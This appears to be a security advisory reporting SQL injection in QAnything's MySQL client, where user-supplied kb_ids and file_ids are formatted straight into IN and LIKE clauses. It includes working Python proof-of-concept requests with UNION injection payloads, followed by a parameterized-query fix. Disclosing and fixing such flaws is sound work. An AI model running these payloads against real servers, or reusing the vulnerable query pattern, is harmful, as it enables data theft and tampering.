# SQL Injection via String Formatting in IN Clauses (Multiple Locations)

## Package Manager

pip

## Version Affected

Latest (commit at time of analysis, 2026-03-12)

## Vulnerability Type

CWE-89: SQL Injection

## CVSS

8.6 (High) — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Write-up

### Title

SQL Injection via `.format()` String Interpolation in MySQL IN Clauses Across Multiple Database Methods

### Description

The QAnything application constructs SQL queries using Python's `.format()` and f-string interpolation for IN clauses, directly embedding user-controlled values (`kb_ids`, `file_ids`) into SQL query strings. While the code wraps values in single quotes using `"'{}'".format(str(x))`, this is not a secure parameterization method and can be bypassed.

**Pattern used throughout `mysql_client.py`:**

```python
# qanything_kernel/connector/database/mysql/mysql_client.py:318-320
kb_ids_str = ','.join("'{}'".format(str(x)) for x in kb_ids)
query = "SELECT kb_id FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0 AND user_id = %s".format(kb_ids_str)
```

This pattern appears in at least 8 methods. The `"'{}'".format(str(x))` wrapping provides NO protection against SQL injection — an attacker simply includes a single quote in the value to break out of the string literal.

**Additionally, `delete_documents()` uses an even more dangerous pattern with double quotes:**

```python
# mysql_client.py:646
query = f"SELECT doc_id FROM Documents WHERE doc_id LIKE \"{file_id}_%\""
doc_ids = self.execute_query_(query, None, fetch=True)  # No parameters at all!
```

**Data flow from HTTP request to SQL execution:**

1. User sends `kb_ids` or `file_ids` via POST request body
2. Handler extracts: `kb_ids = safe_get(req, 'kb_ids')` or `file_ids = safe_get(req, 'file_ids')`
3. Values pass through `correct_kb_id()` (only appends suffix, no sanitization)
4. Passed to mysql_client methods which use `.format()` to build SQL

#### Proof of Concept

**1. SQL Injection via kb_ids in check_kb_exist (used by delete_knowledge_base, list_files, etc.):**

```python
import requests

target = "http://localhost:8777"

# Inject via kb_ids — extract data from User table
payload = {
    "user_id": "attacker",
    "user_info": "1234",
    "kb_ids": ["' UNION SELECT user_id FROM User WHERE '1'='1"]
}

resp = requests.post(f"{target}/api/local_doc_qa/delete_knowledge_base", json=payload)
print(resp.json())
# The injected UNION query leaks user IDs in the error message or response
```

**2. SQL Injection via file_ids in check_file_exist:**

```python
payload = {
    "user_id": "attacker",
    "user_info": "1234",
    "kb_id": "valid_kb_id",
    "file_ids": ["' OR '1'='1' UNION SELECT file_location, status FROM File WHERE '1'='1"]
}

resp = requests.post(f"{target}/api/local_doc_qa/delete_files", json=payload)
print(resp.json())
```

**3. Blind SQL Injection via delete_documents (no parameterization at all):**

```python
# file_id with double-quote breakout
# mysql_client.py:646: query = f'SELECT doc_id FROM Documents WHERE doc_id LIKE "{file_id}_%"'
# Since this is called with valid_file_ids after DB check, direct exploitation requires
# a poisoned file_id in the database. However, if combined with the IN clause injection
# above, an attacker can insert arbitrary file_ids into the File table first.
```

### Impact

- **Confidentiality**: HIGH — Attacker can extract data from any table using UNION-based injection.
- **Integrity**: HIGH — Attacker can modify data using stacked queries or subquery-based UPDATE.
- **Availability**: HIGH — Attacker can delete tables or corrupt data.

## Occurrences

### Occurrence 1

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L315-L325
- **Description**: `check_kb_exist()` — `kb_ids` from user input formatted into IN clause with `.format()`.

### Occurrence 2

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L339-L353
- **Description**: `check_file_exist()` — `file_ids` from user input formatted into IN clause.

### Occurrence 3

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L539-L543
- **Description**: `get_chunk_size()` — `file_ids` in f-string with empty parameter tuple `()`.

### Occurrence 4

- **Permalink**: https://github.com/netease-youdao/QAnything/blob/master/qanything_kernel/connector/database/mysql/mysql_client.py#L642-L647
- **Description**: `delete_documents()` — `file_id` in f-string with double quotes, `execute_query_` called with `None` params.

## Suggested Fix

Replace all `.format()` / f-string SQL construction with parameterized queries:

```diff
--- a/qanything_kernel/connector/database/mysql/mysql_client.py
+++ b/qanything_kernel/connector/database/mysql/mysql_client.py
@@ -315,4 +315,4 @@
     def check_kb_exist(self, user_id, kb_ids):
         if not kb_ids:
             return []
-        kb_ids_str = ','.join("'{}'".format(str(x)) for x in kb_ids)
-        query = "SELECT kb_id FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0 AND user_id = %s".format(kb_ids_str)
-        result = self.execute_query_(query, (user_id,), fetch=True)
+        placeholders = ','.join(['%s'] * len(kb_ids))
+        query = "SELECT kb_id FROM KnowledgeBase WHERE kb_id IN ({}) AND deleted = 0 AND user_id = %s".format(placeholders)
+        result = self.execute_query_(query, (*kb_ids, user_id), fetch=True)
```

Apply the same pattern to all affected methods. For `delete_documents()`:

```diff
-    query = f"SELECT doc_id FROM Documents WHERE doc_id LIKE \"{file_id}_%\""
-    doc_ids = self.execute_query_(query, None, fetch=True)
+    query = "SELECT doc_id FROM Documents WHERE doc_id LIKE CONCAT(%s, '_%')"
+    doc_ids = self.execute_query_(query, (file_id,), fetch=True)
```

**Verified:** After switching to parameterized queries, injected payloads in `kb_ids` and `file_ids` are treated as literal string values and do not alter query structure.

## References

- https://cwe.mitre.org/data/definitions/89.html
- https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
